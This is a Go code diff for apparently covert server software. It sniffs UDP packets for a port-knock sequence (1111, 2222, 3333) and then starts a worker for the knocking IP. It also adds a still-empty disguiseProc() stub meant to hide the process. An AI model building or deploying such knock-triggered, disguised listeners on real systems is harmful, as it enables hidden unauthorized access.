@@ -2,7 +2,6 @@ package main
 
 import (
 	"fmt"
-	_ "net"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -10,8 +9,10 @@ import (
 )
 
 func main() {
-	fmt.Println("Hello Go!")
-	listenForKnocks("any")
+	fmt.Println("Server Running")
+	disguiseProc()
+	listenForKnocks("wlp3s0")
+	//serverWorker(net.ParseIP("192.168.1.46"))
 }
 
 func listenForKnocks(ifaceName string) {
@@ -71,7 +72,8 @@ func listenForKnocks(ifaceName string) {
 		addKnock(clients, ipStr, udpLayer.DstPort)
 
 		if checkKnocks(clients, ipStr) {
-			go serverWorker(ipv4Layer.SrcIP)
+			fmt.Printf("%+v\n", clients)
+			go serverWorker(ipv4Layer.SrcIP.String())
 			delete(clients, ipStr)
 		}
 	}
@@ -97,9 +99,13 @@ func checkKnocks(clients map[string]map[layers.UDPPort]bool, ip string) bool {
 	var ports = []layers.UDPPort{1111, 2222, 3333}
 
 	for _, port := range ports {
-		if !clients[ip][port] {
+		if !(clients[ip][port]) {
 			return false
 		}
 	}
 	return true
+}
+
+func disguiseProc() {
+	//TODO
 }
